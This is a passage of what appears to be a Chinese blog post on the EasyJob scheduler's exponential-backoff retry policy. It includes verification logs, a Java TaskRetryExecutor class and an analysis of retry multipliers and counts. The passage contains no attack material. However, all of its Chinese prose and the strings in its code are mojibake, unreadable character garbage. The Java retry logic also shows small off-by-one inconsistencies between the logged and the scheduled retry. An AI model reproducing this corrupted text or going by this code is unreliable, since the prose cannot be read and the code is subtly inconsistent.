<h3 data-id="heading-2">2.1 éªŒè¯EasyJobçš„é‡è¯•ç­–ç•¥</h3>
<p>åœ¨å¤ç›˜é—®é¢˜çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å‘ç°äº†EasyJobåˆ†å¸ƒå¼ä»»åŠ¡æ˜¯å…·æœ‰é‡è¯•ç­–ç•¥çš„ï¼Œåªæ˜¯é»˜è®¤ä¸å¼€å¯ï¼Œè€Œä¸æ˜¯é»˜è®¤å¼€å¯ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b574a7bec64c4de3a9b0d7cb3086ef00~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=1nSIBB6reHYE1i43vUcBcyL69qU%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>è¯¥ç­–ç•¥ä»¥ä¸‰ä¸ªæ ¸å¿ƒå‚æ•°ä¸ºåŸºç¡€ï¼šé¦–æ¬¡é‡è¯•é—´éš”æ—¶é—´ Fã€é‡è¯•é—´éš”ä¹˜æ•° M å’Œæœ€å¤§é‡è¯•æ¬¡æ•° Cã€‚</p>
<p>é€šè¿‡è¿™ä¸‰ä¸ªå‚æ•°çš„ç»„åˆï¼Œæˆ‘ä»¬å¯ä»¥çµæ´»æ§åˆ¶ä»»åŠ¡é‡è¯•èŠ‚å¥ï¼Œå¹³è¡¡ç³»ç»Ÿè´Ÿè½½ä¸ä»»åŠ¡æ¢å¤æ•ˆç‡ã€‚â€‹</p>
<p>ä¾‹å¦‚ï¼šé…ç½®t=10s, M=2, C=10ï¼Œåˆ™é—´éš”æ—¶é—´ä¾æ¬¡æ˜¯ï¼š</p>



































<table><thead><tr><th>é‡è¯•æ¬¡æ•° nn</th><th>é—´éš”æ—¶é—´è®¡ç®—æ–¹å¼</th><th>é—´éš”æ—¶é—´ç»“æœ</th></tr></thead><tbody><tr><td>1</td><td>10sï¼ˆåˆå§‹é—´éš”ï¼Œæ— è®¡ç®—ï¼‰</td><td>10s</td></tr><tr><td>2</td><td>10sÃ—2</td><td>20s</td></tr><tr><td>3</td><td>20sÃ—2</td><td>40s</td></tr><tr><td>4</td><td>40sÃ—2</td><td>80s</td></tr><tr><td>5</td><td>80sÃ—2</td><td>160s</td></tr></tbody></table>
<p>éªŒè¯æ—¥å¿—ï¼š</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-number">21</span>:<span class="hljs-number">45</span>:<span class="hljs-number">29.990</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-1</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
<span class="hljs-number">21</span>:<span class="hljs-number">45</span>:<span class="hljs-number">40.204</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-2</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
<span class="hljs-number">21</span>:<span class="hljs-number">46</span>:<span class="hljs-number">00.674</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-3</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
<span class="hljs-number">21</span>:<span class="hljs-number">46</span>:<span class="hljs-number">41.749</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-4</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
<span class="hljs-number">21</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02.398</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-5</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
<span class="hljs-number">21</span>:<span class="hljs-number">50</span>:<span class="hljs-number">43.008</span> [main-schedule-worker-pool<span class="hljs-number">-1</span>-thread<span class="hljs-number">-1</span>] INFO  cn.jdl.tech_and_data.EmailSendingTask - å¼€å§‹æ‰§è¡Œå‘é€é‚®ä»¶ä»»åŠ¡
</code></pre>








































<table><thead><tr><th>ä»»åŠ¡åºå·</th><th>å¼€å§‹æ—¶é—´</th><th>ä¸å‰ä¸€ä»»åŠ¡çš„é—´éš”</th></tr></thead><tbody><tr><td>ç¬¬ 1 ä¸ªä»»åŠ¡</td><td>21:45:29.990</td><td>-</td></tr><tr><td>ç¬¬ 2 ä¸ªä»»åŠ¡</td><td>21:45:40.204</td><td>10.214 ç§’</td></tr><tr><td>ç¬¬ 3 ä¸ªä»»åŠ¡</td><td>21:46:00.674</td><td>20.47 ç§’</td></tr><tr><td>ç¬¬ 4 ä¸ªä»»åŠ¡</td><td>21:46:41.749</td><td>41.075 ç§’</td></tr><tr><td>ç¬¬ 5 ä¸ªä»»åŠ¡</td><td>21:48:02.398</td><td>80.649 ç§’ï¼ˆçº¦ 1 åˆ† 20.65 ç§’ï¼‰</td></tr><tr><td>ç¬¬ 6 ä¸ªä»»åŠ¡</td><td>21:50:43.008</td><td>160.61 ç§’ï¼ˆçº¦ 2 åˆ† 40.61 ç§’ï¼‰</td></tr></tbody></table>
<p>ä¸ä¸Šé¢è®¡ç®—çš„ä¸€è‡´ã€‚</p>
<p>éªŒè¯æ–¹æ¡ˆï¼š</p>
<p>1ã€å®ç°æ¥å£ï¼šcom.wangyin.schedule.client.job.ScheduleFlowTaskï¼Œå¹¶è®¾ç½®ä»»åŠ¡è¿”å›å¤±è´¥ï¼š</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e96b7e58f46c490594b3455d9aa213e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=oSbGfpss1qjiKqq5wq60SCNn2tQ%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>2ã€åˆ›å»ºCRONè§¦å‘å™¨</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0d8fbfe2f5f34d3492c6e5187697e58b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=8uuZbq8uSbqLfaRnu1Mb3YeeIQA%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>3ã€è®¾ç½®è‡ªåŠ¨é‡è¯•å‚æ•°</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2042632a7a574b8dbdf7265b8bc29b8c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=o9JLDrqub9JJaiJNk59jFN7%2BW%2B8%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c5ea810191ea4be9b86c6233b2c26571~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=db5iJIkULRetibDvYW4CVs3pa%2Fc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>4ã€æš‚åœä»»åŠ¡å¹¶æ‰‹å·¥è§¦å‘ä¸€æ¬¡</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b7e740fd7b484070aedc2a64098a9622~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=kQMZXr95jJSw%2B1qADFIq7PzBDuE%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<h3 data-id="heading-3">2.2 å®ç°ä¸€ä¸ªç®€å•çš„é‡è¯•ç­–ç•¥</h3>
<p>æ ¹æ®ä¸Šè¿°ç­–ç•¥ï¼Œç®€å•å®ç°äº†ä¸€ä¸ªçµæ´»å¯é…ç½®çš„ä»»åŠ¡é‡è¯•æœºåˆ¶ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TaskRetryExecutor</span> {
    <span class="hljs-meta">@Getter</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">executor</span> <span class="hljs-operator">=</span> newScheduledThreadPool(<span class="hljs-number">10</span>);
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> firstRetryInterval;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> intervalMultiplier;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> maxRetryCount;

    <span class="hljs-keyword">public</span> <span class="hljs-title function_">TaskRetryExecutor</span><span class="hljs-params">(<span class="hljs-type">long</span> firstRetryInterval, <span class="hljs-type">int</span> intervalMultiplier, <span class="hljs-type">int</span> maxRetryCount)</span> {
        <span class="hljs-built_in">this</span>.firstRetryInterval = firstRetryInterval;
        <span class="hljs-built_in">this</span>.intervalMultiplier = intervalMultiplier;
        <span class="hljs-built_in">this</span>.maxRetryCount = maxRetryCount;
    }

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">submitRetryableTask</span><span class="hljs-params">(Runnable task)</span> {
        executeWithRetry(task, <span class="hljs-number">1</span>);
    }

    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">executeWithRetry</span><span class="hljs-params">(Runnable task, <span class="hljs-type">int</span> currentRetryCount)</span> {
        executor.schedule(() -&gt; {
            <span class="hljs-keyword">try</span> {
                task.run();
                log.info(<span class="hljs-string">"ä»»åŠ¡åœ¨ç¬¬{}æ¬¡å°è¯•æ—¶æˆåŠŸæ‰§è¡Œ"</span>, currentRetryCount);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                log.error(<span class="hljs-string">"ä»»åŠ¡åœ¨ç¬¬{}æ¬¡å°è¯•æ—¶æ‰§è¡Œå¤±è´¥"</span>, currentRetryCount, e);
                <span class="hljs-keyword">if</span> (currentRetryCount &lt;= maxRetryCount) {
                    <span class="hljs-type">long</span> <span class="hljs-variable">delay</span> <span class="hljs-operator">=</span> calculateRetryDelay(currentRetryCount);
                    log.info(<span class="hljs-string">"è®¡åˆ’åœ¨{}æ¯«ç§’åè¿›è¡Œç¬¬{}æ¬¡é‡è¯•"</span>, delay, currentRetryCount);
                    executeWithRetry(task, currentRetryCount + <span class="hljs-number">1</span>);
                } <span class="hljs-keyword">else</span> {
                    log.error(<span class="hljs-string">"è¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°ã€‚ä»»åŠ¡æ‰§è¡Œæœ€ç»ˆå¤±è´¥ã€‚"</span>);
                }
            }
        }, currentRetryCount == <span class="hljs-number">1</span> ? <span class="hljs-number">0</span> : calculateRetryDelay(currentRetryCount), TimeUnit.MILLISECONDS);
    }

    <span class="hljs-keyword">public</span> <span class="hljs-type">long</span> <span class="hljs-title function_">calculateRetryDelay</span><span class="hljs-params">(<span class="hljs-type">int</span> retryCount)</span> {
        <span class="hljs-keyword">if</span> (retryCount == <span class="hljs-number">1</span>) {
            <span class="hljs-keyword">return</span> firstRetryInterval;
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (retryCount &gt; <span class="hljs-number">1</span> &amp;&amp; retryCount &lt;= maxRetryCount) {
            <span class="hljs-type">long</span> <span class="hljs-variable">previousDelay</span> <span class="hljs-operator">=</span> calculateRetryDelay(retryCount - <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> previousDelay * intervalMultiplier;
        }
        <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>; <span class="hljs-comment">// è¶…å‡ºæœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œè¿”å›é”™è¯¯æ ‡è¯†</span>
    }
}
</code></pre>
<p>â€‹åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼š</p>
<p>1.TaskRetryExecutorç±»å°è£…äº†ä»»åŠ¡é‡è¯•çš„æ ¸å¿ƒé€»è¾‘ã€‚æ„é€ å‡½æ•°æ¥æ”¶ä¸‰ä¸ªå…³é”®å‚æ•°ï¼šfirstRetryIntervalã€intervalMultiplierå’ŒmaxRetryCountï¼Œç”¨äºé…ç½®é‡è¯•ç­–ç•¥ï¼Œå¯¹åº”äºEasyJobçš„Fã€Mã€Cå‚æ•°ã€‚</p>
<p>2.submitRetryableTaskæ–¹æ³•æ¥æ”¶ä¸€ä¸ªå¯æ‰§è¡Œä»»åŠ¡ï¼Œå¹¶å¯åŠ¨é‡è¯•æµç¨‹ã€‚å®ƒè°ƒç”¨executeWithRetryæ–¹æ³•ï¼Œåˆå§‹é‡è¯•æ¬¡æ•°ä¸º1ã€‚</p>
<p>3.executeWithRetryæ–¹æ³•æ˜¯é‡è¯•é€»è¾‘çš„æ ¸å¿ƒã€‚å®ƒä½¿ç”¨ScheduledExecutorServiceæ¥è°ƒåº¦ä»»åŠ¡æ‰§è¡Œï¼š</p>
<p>â—¦å¦‚æœä»»åŠ¡æ‰§è¡ŒæˆåŠŸï¼Œè®°å½•æˆåŠŸæ—¥å¿—ã€‚</p>
<p>â—¦â€¢å¦‚æœä»»åŠ¡æ‰§è¡Œå¤±è´¥ä¸”æœªè¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œè®¡ç®—ä¸‹ä¸€æ¬¡é‡è¯•çš„å»¶è¿Ÿæ—¶é—´ï¼Œå¹¶é€’å½’è°ƒç”¨è‡ªèº«è¿›è¡Œé‡è¯•ã€‚</p>
<p>â—¦â€¢å¦‚æœè¶…è¿‡æœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œè®°å½•æœ€ç»ˆå¤±è´¥æ—¥å¿—ã€‚</p>
<p>4.calculateRetryDelayæ–¹æ³•å®ç°äº†é‡è¯•é—´éš”çš„è®¡ç®—è§„åˆ™ï¼š</p>
<p>â—¦ç¬¬ä¸€æ¬¡é‡è¯•ä½¿ç”¨firstRetryIntervalã€‚</p>
<p>â—¦ä¹‹åçš„é‡è¯•é—´éš”æ˜¯å‰ä¸€æ¬¡é—´éš”ä¹˜ä»¥intervalMultiplierã€‚</p>
<p>â—¦å¦‚æœè¶…å‡ºæœ€å¤§é‡è¯•æ¬¡æ•°ï¼Œè¿”å›-1è¡¨ç¤ºé”™è¯¯ã€‚</p>
<p>é€šè¿‡è¿™ç§è®¾è®¡ï¼Œæˆ‘ä»¬å®ç°äº†ä¸€ä¸ªå¯å¤ç”¨ã€å¯é…ç½®çš„ä»»åŠ¡é‡è¯•æœºåˆ¶ã€‚å®ƒèƒ½å¤Ÿæ ¹æ®é…ç½®çš„å‚æ•°è‡ªåŠ¨è°ƒæ•´é‡è¯•é—´éš”ï¼Œåœ¨ä»»åŠ¡å¤±è´¥æ—¶è¿›è¡Œæœ‰ç­–ç•¥çš„é‡è¯•ï¼ŒåŒæ—¶é¿å…æ— é™é‡è¯•å¯¼è‡´çš„èµ„æºæµªè´¹ã€‚</p>
<p>è¯¦ç»†ä»£ç å¯åœ¨ä»¥ä¸‹Gitä»“åº“ä¸­æ‰¾åˆ°ï¼š<a href="https://link.juejin.cn?target=mailto%3Agit%40coding.jd.com" target="_blank" title="mailto:git@coding.jd.com" ref="nofollow noopener noreferrer">git@coding.jd.com</a>:newJavaEngineerOrientation/TaskRetryStrategies.git</p>
<h3 data-id="heading-4">2.3 é‡è¯•ç­–ç•¥çš„ç†è®ºåˆ†æ</h3>
<h4 data-id="heading-5">2.3.1 EasyJobå¯¹ä¹˜æ•°å’Œæœ€å¤§é‡è¯•æ¬¡æ•°çš„é™åˆ¶</h4>
<p>åœ¨å¯¹EasyJobä¹Ÿè¿›è¡Œäº†é‡è¯•çš„éªŒè¯ä¸­å‘ç°ï¼š</p>
<p>1.<strong>æ¯æ¬¡é‡åšçš„ä¹˜æ•°</strong>å–å€¼èŒƒå›´æ˜¯[1,8]ï¼Œå¯ä»¥æ˜¯å…·æœ‰ä¸€ä½å°æ•°ä½çš„æµ®ç‚¹æ•°ï¼Œæ¯”å¦‚3.5ï¼Œ</p>
<p>2.<strong>æœ€å¤šé‡åšæ¬¡æ•°</strong>æ˜¯[1,16]é—´çš„æ•´æ•°ï¼Œç¬¬ä¸€æ¬¡é‡è¯•çš„é—´éš”æ²¡æœ‰é™åˆ¶ï¼Œå•ä½æ˜¯ç§’ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/61f6fbdd96984b6dbec76143900f644f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=ne%2F5PGM%2FeWDW0rEDk4wSRsVd9Sc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<h4 data-id="heading-6">2.3.2 æ¢¯åº¦åˆ†æ</h4>
<p>é€šè¿‡ä¸Šé¢çš„éªŒè¯å’Œé‡è¯•ç›¸å…³æ¦‚å¿µçš„å®šä¹‰ï¼Œå¯ä»¥å¾—åˆ°ï¼šç¬¬næ¬¡é‡è¯•çš„é—´éš”æ—¶é—´=ç¬¬ä¸€æ¬¡é—´éš”æ—¶é—´*ä¹˜æ•°^(n-1)ï¼Œå³ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9d5ae3fcf7f424fa69c7982658b5482~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=VADFj4RfwUNoSMlLSyRQpFNwS4Y%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å…¶ä¸­ï¼š</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48604f149d244dd0884133d0bf0ddaaa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=zU%2B7NJbkMcDkhHSfNLRPoR6aYwI%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å¯¹ä¹˜æ•°Mçš„æ¢¯åº¦ï¼š</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5bf02650ad94b84a3dd2c06dbd9e1b3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=JVam21aBAyxH2UqkxfvnMyzSByc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å¯¹é‡è¯•æ¬¡æ•°nçš„æ¢¯åº¦ï¼š</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/220c8e6e16f741b4b6fae21c79d12ad1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=39uDi9yB6E2FPxHQgeWdmmKncpc%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>è¯¦ç»†æ¨å¯¼ï¼š <a href="https://link.juejin.cn?target=http%3A%2F%2Fxingyun.jd.com%2FcodingRoot%2FnewJavaEngineerOrientation%2FTaskRetryStrategies%2Fblob%2Fmaster%2Fsrc%2Fmain%2Fresources%2F%25E5%2585%25AC%25E5%25BC%258F%25E6%258E%25A8%25E5%25AF%25BC.md" target="_blank" title="http://xingyun.jd.com/codingRoot/newJavaEngineerOrientation/TaskRetryStrategies/blob/master/src/main/resources/%E5%85%AC%E5%BC%8F%E6%8E%A8%E5%AF%BC.md" ref="nofollow noopener noreferrer">xingyun.jd.com/codingRoot/â€¦</a></p>
<p>ä»ä¸‹å›¾å¯ä»¥çœ‹å‡ºï¼Œé‡è¯•æ¬¡æ•°nè¾ƒå¤§æ—¶ï¼ˆæ¯”å¦‚8ï¼‰ï¼Œä¹˜æ•° M çš„ç»†å¾®å˜åŒ–éƒ½ä¼šå¯¼è‡´ï¼Œä»»åŠ¡çš„é—´éš”æ—¶é—´å‘ç”Ÿå‰§çƒˆå˜åŒ–ï¼Œå› æ­¤nè¶…è¿‡8ä¹‹åï¼ŒMåŸºæœ¬ä¸å¯è°ƒã€‚</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/30ce07a86d3c489b8f653e803454e0d3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=tl1UKWeCe5yzmc%2FzasYVAw6YYLw%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>åŒæ ·çš„ï¼Œä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œä¹˜æ•°Mè¾ƒå¤§æ—¶ï¼ˆæ¯”å¦‚4ï¼‰ï¼Œnçš„ç»†å¾®å˜åŒ–ä¹Ÿä¼šå¯¼è‡´ä»»åŠ¡çš„é—´éš”æ—¶é—´çˆ†å‘å¼çš„å¢åŠ ã€‚</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f89314343f374ead9a0c5df8bc591eac~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=dE0pqW8mBrLkN3k6igjK1wHbynk%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<h5 data-id="heading-7">1ã€ä¹˜æ•°åœ¨1.5-4 çš„åˆç†æ€§</h5>
<p>è¿‡å°ä¹˜æ•° (&lt;1.5) çš„é—®é¢˜ï¼š</p>
<p>å½“ä¹˜æ•° = 1.2ï¼Œé‡è¯• 10 æ¬¡çš„é—´éš”æ—¶é—´æ˜¯ï¼š1æ¬¡:1, 2æ¬¡:1.2, 3æ¬¡:1.44, ..., 10æ¬¡:5.16ï¼Œ</p>
<p>10 æ¬¡é‡è¯•æ€»é—´éš”ä»… 5 å€ï¼Œæ¥è¿‘å›ºå®šé—´éš”ï¼Œå¯èƒ½å¯¼è‡´ "æƒŠç¾¤æ•ˆåº”"ï¼ˆå¤§é‡è¯·æ±‚åŒæ—¶é‡è¯•ï¼‰ã€‚</p>
<p>è¿‡å¤§ä¹˜æ•° (&gt;4) çš„é—®é¢˜</p>
<p>å½“ä¹˜æ•° = 8ï¼Œé‡è¯• 5 æ¬¡çš„é—´éš”æ—¶é—´ï¼š1æ¬¡:1, 2æ¬¡:8, 3æ¬¡:64, 4æ¬¡:512, 5æ¬¡:4096</p>
<p>5 æ¬¡é‡è¯•åé—´éš”å·²è¶… 1 å°æ—¶ï¼ˆå‡è®¾åˆå§‹é—´éš”æ—¶é—´æ˜¯æœ€å°çš„1sï¼Œ4096s&gt;1å°æ—¶ï¼‰ï¼Œå¯èƒ½å¯¼è‡´è¯·æ±‚é•¿æ—¶é—´ç­‰å¾…ï¼Œç”¨æˆ·ä½“éªŒå·®ã€‚</p>
<p>å› æ­¤ï¼Œä¹˜æ•° = 1.5-4 åœ¨ "é€€é¿æ•ˆç‡" å’Œ "èµ„æºæ¶ˆè€—" é—´å–å¾—å¹³è¡¡ï¼Œä¸€èˆ¬å–ä¹˜æ•°= 2 ï¼ˆæ ‡å‡†æŒ‡æ•°é€€é¿ï¼‰ã€‚</p>
<p>è¡Œä¸šå®è·µï¼šAWS SDK é»˜è®¤ä¹˜æ•° = 2ï¼ŒGoogle gRPC é‡è¯•ç­–ç•¥æ¨èä¹˜æ•° = 1.5-3ï¼Œå¤šæ•° HTTP å®¢æˆ·ç«¯åº“ (å¦‚ requests) é»˜è®¤ä¹˜æ•° = 2ã€‚</p>
<h5 data-id="heading-8">2ã€æœ€å¤§é‡è¯•æ¬¡æ•°3-10çš„åˆç†æ€§</h5>
<p>å‡è®¾å•æ¬¡é‡è¯•æˆåŠŸæ¦‚ç‡ä¸ºPï¼ˆæ¯”å¦‚ç½‘ç»œ/æœåŠ¡ä¸´æ—¶æ•…éšœï¼Œé‡è¯•æˆåŠŸæ¦‚ç‡é€šå¸¸è¾ƒé«˜ï¼‰ï¼Œé‡è¯• næ¬¡è‡³å°‘æˆåŠŸ 1 æ¬¡çš„æ¦‚ç‡ä¸ºï¼š</p>
<p>ï»¿</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c458cc86847344c392999105849c5040~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=Ycx2K4flJCbvb%2B%2FD5K%2FdlcvGFLI%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï»¿</p>
<p>å½“ p=0.5ï¼Œï¼ˆå•æ¬¡é‡è¯• 50% æˆåŠŸæ¦‚ç‡ï¼‰ï¼š</p>
<p>n=3 æ—¶ï¼ŒæˆåŠŸæ¦‚ç‡ =1âˆ’(0.5)^3=87.5%</p>
<p>n=5 æ—¶ï¼ŒæˆåŠŸæ¦‚ç‡ =1âˆ’(0.5)^5=96.875%</p>
<p>n=10 æ—¶ï¼ŒæˆåŠŸæ¦‚ç‡ =1âˆ’(0.5)^10â‰ˆ99.9%</p>
<p>å®é™…åœºæ™¯ä¸­ï¼Œ<strong>ä¸´æ—¶æ•…éšœçš„å•æ¬¡æˆåŠŸæ¦‚ç‡è¿œé«˜äº 50%</strong> ï¼ˆæ¯”å¦‚ç½‘ç»œæŠ–åŠ¨é‡è¯•æˆåŠŸæ¦‚ç‡å¯èƒ½è¾¾ 80%ï¼‰</p>
<p>è‹¥ p=0.8ï¼Œn=3æ—¶æˆåŠŸæ¦‚ç‡å·²è¾¾ 1âˆ’0.2^3=99.2%å‡ ä¹è¦†ç›–æ‰€æœ‰ä¸´æ—¶æ•…éšœã€‚</p>
<p>å› æ­¤ï¼Œ3 - 10 æ¬¡é‡è¯•ï¼Œèƒ½ä»¥æé«˜æ¦‚ç‡ï¼ˆ99%+ï¼‰è¦†ç›–â€œä¸´æ—¶æ•…éšœâ€åœºæ™¯ï¼Œå†å¢åŠ æ¬¡æ•°å¯¹æˆåŠŸæ¦‚ç‡æå‡ææœ‰é™ï¼ˆè¾¹é™…æ•ˆåº”é€’å‡ï¼‰ã€‚</p>
<p>å› ä¸ºå·²çŸ¥çš„ä»»åŠ¡å»¶è¿Ÿæ—¶é—´çš„å…¬å¼æ˜¯ï¼š</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b6d1fded5dae4c4499a5aaff2295421d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqs5Lic5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769593062&amp;x-signature=%2FUJ4ZAOmysCsjXL96s46Hw7fm5I%3D" alt="" loading="lazy"/></p>
<p>ï»¿ï¼Œ</p>
<p>nä»1åˆ°Cè¿›è¡Œç´¯åŠ å¾—åˆ°æ€»è€—æ—¶:</p>
